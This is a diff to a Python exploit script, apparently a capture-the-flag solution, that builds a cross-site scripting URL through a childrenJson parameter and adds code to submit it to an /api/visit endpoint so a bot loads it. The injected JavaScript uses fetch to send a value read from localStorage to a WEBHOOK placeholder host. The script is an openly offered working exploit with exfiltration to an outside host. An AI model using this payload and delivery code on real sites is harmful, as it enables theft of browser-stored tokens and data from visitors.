@@ -1,5 +1,6 @@
 from urllib.parse import quote
 import json
+import requests
 
 def generate_children_json(payload):
     if not payload:
@@ -25,4 +26,16 @@ payload += 'setTimeout(() => { fetch("WEBHOOK"+"?flag="+localStorage.getItem("de
 children_json_quoted = generate_children_json(payload)
 url_p = f"{base}?name=span&src=&childrenJson={children_json_quoted}"
 
-print(url_p)
+print(f"Generated URL: {url_p}")
+
+# Send the URL to the /api/visit endpoint
+api_url = f"{base}api/visit"
+payload_data = {"url": url_p}
+
+print(f"\nSending POST request to {api_url}...")
+try:
+    response = requests.post(api_url, json=payload_data, headers={"Content-Type": "application/json"})
+    print(f"Response status: {response.status_code}")
+    print(f"Response body: {response.json()}")
+except Exception as e:
+    print(f"Error: {e}")
